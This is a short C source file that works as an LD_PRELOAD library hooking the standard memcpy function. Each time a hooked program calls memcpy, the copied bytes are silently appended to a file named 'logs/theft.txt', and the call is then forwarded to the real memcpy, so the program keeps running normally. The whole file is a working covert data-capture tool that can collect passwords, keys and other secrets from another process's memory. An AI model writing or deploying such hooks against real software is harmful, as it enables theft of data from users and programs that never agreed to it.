
#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdio.h>

const char *HOOK_FILE_PATH = "logs/theft.txt";

typedef void *(*memcpy_t)(void *, const void *, size_t);

void *memcpy (void *destination, const void *source, size_t n)
{

    FILE *fd = fopen(HOOK_FILE_PATH, "a");
    if (fd != NULL) {
        char dest[n]; 

        for (size_t i=0; i < n; i++)
            *(dest + i) = *((const char *)source + i);

        fwrite(dest, n, sizeof(char), fd);
        fclose(fd);
    }
    
    memcpy_t orig_memcpy;
    orig_memcpy = (memcpy_t) dlsym(RTLD_NEXT,"memcpy");
    return orig_memcpy(destination, source, n);;
}